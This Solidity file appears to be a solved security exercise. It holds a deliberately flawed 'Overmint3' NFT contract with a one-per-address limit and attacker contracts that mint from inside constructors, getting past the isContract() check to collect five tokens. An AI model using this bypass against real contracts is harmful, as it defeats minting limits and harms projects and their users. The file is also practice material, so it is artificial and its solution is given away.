// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint3 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!msg.sender.isContract(), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
}

contract Overmint3Attacker {
    Overmint3 public overmint;

    constructor(address _overmint) {
        overmint = Overmint3(_overmint);
        for (uint256 i = 1; i < 6; i++) {
            Overmint3Minter minter = new Overmint3Minter(_overmint, i);
            overmint.transferFrom(address(this), msg.sender, i);
        }
    }
}
contract Overmint3Minter {
    Overmint3 public overmint;
    constructor(address _overmint, uint256 tokenId) {
        overmint = Overmint3(_overmint);
        overmint.mint();
        overmint.transferFrom(address(this), msg.sender, tokenId);
    }
}
